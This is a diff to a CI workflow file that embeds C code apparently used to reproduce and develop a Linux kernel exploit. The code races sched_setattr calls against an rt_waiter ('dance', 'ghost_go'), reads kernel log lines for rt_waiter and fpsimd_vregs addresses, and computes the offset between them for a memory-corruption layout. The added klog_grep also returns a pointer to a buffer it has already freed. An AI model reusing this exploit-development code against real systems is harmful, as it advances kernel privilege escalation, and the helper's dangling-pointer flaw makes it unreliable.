@@ -237,7 +237,11 @@ jobs:
           }
 
           static void *consumer_fn(void *a) {
+            printf("REPRO consumer enter tid=%d gotid=%d\n", waiter_tid, (int)syscall(SYS_gettid));
+            fflush(stdout);
             while (!ghost_go) usleep(1000);
+            printf("REPRO consumer saw ghost_go=1 tid=%d\n", waiter_tid);
+            fflush(stdout);
             usleep(100000);
             for (int i = 0; i < 20 && !consumer_done; i++) {
               struct sched_attr_x attr;
@@ -247,9 +251,13 @@ jobs:
               attr.sched_nice = (i % 19) + 1;
               long r = syscall(SYS_sched_setattr, waiter_tid, &attr, 0);
               printf("REPRO consumer sched_setattr i=%d tid=%d ret=%ld errno=%d idx=%d\n", i, waiter_tid, r, errno, dance_idx);
+              fflush(stdout);
+              if (r != 0) break;
               usleep(10000);
             }
             consumer_done = 1;
+            printf("REPRO consumer exit\n");
+            fflush(stdout);
             return NULL;
           }
 
@@ -372,35 +380,41 @@ jobs:
             return edeadlk ? 35 : rq;
           }
 
-          static void find_delta(unsigned long *qwaiter, unsigned long *fpsimd, long *pshift) {
-            *qwaiter = *fpsimd = 0; *pshift = 0;
+          static void klog_grep(const char *needle, int nl, unsigned long *out, char **tail) {
             const size_t cap = 1 << 20;
             char *buf = malloc(cap);
-            if (!buf) { printf("REPRO malloc fail\n"); return; }
+            if (!buf) return;
             long n = syscall(SYS_syslog, 3, buf, (int)cap);
-            if (n <= 0) { printf("REPRO klog read fail n=%ld errno=%d\n", n, errno); free(buf); return; }
+            if (n <= 0) { free(buf); return; }
             buf[n] = 0;
             char *p = buf;
-            while ((p = strstr(p, "DBG rt_waiter=")) != NULL) {
-              *qwaiter = strtoull(p + 14, NULL, 16);
-              p += 14;
+            unsigned long last = 0;
+            while ((p = strstr(p, needle)) != NULL) {
+              last = strtoull(p + nl, NULL, 16);
+              p += nl;
             }
-            p = buf;
-            while ((p = strstr(p, "DBG fpsimd_vregs=")) != NULL) {
-              *fpsimd = strtoull(p + 17, NULL, 16);
-              p += 17;
+            if (out) *out = last;
+            if (tail && n > 0) *tail = buf;
+            free(buf);
+          }
+
+          /* 轮询 klog 直到 DBG fpsimd_vregs 出现（sigreturn 拷贝晚于 dance 返回约 10s） */
+          static void find_delta(unsigned long *qwaiter, unsigned long *fpsimd, long *pshift) {
+            *qwaiter = *fpsimd = 0; *pshift = 0;
+            for (int i = 0; i < 60; i++) {
+              klog_grep("DBG rt_waiter=", 14, qwaiter, NULL);
+              klog_grep("DBG fpsimd_vregs=", 17, fpsimd, NULL);
+              printf("REPRO poll[%d] q_waiter=%016lx fpsimd_vregs=%016lx\n", i, *qwaiter, *fpsimd);
+              if (*qwaiter && *fpsimd) break;
+              usleep(500000);
             }
-            printf("REPRO delta parse q_waiter=%016lx fpsimd_vregs=%016lx klog_bytes=%ld\n",
-                   *qwaiter, *fpsimd, n);
             if (*qwaiter && *fpsimd) {
               long delta = (long)(*qwaiter - *fpsimd);
               *pshift = delta / 8;
-              printf("REPRO delta=%ld words=%ld\n", delta, *pshift);
+              printf("REPRO delta=%ld bytes=%ld words (word_shift)\n", delta, *pshift);
+            } else {
+              printf("REPRO measure FAIL: q_waiter=%016lx fpsimd=%016lx\n", *qwaiter, *fpsimd);
             }
-            if (!*qwaiter || !*fpsimd) {
-              printf("REPRO klog tail: %.600s\n", buf + (n > 600 ? n - 600 : 0));
-            }
-            free(buf);
           }
 
           int main(void) {
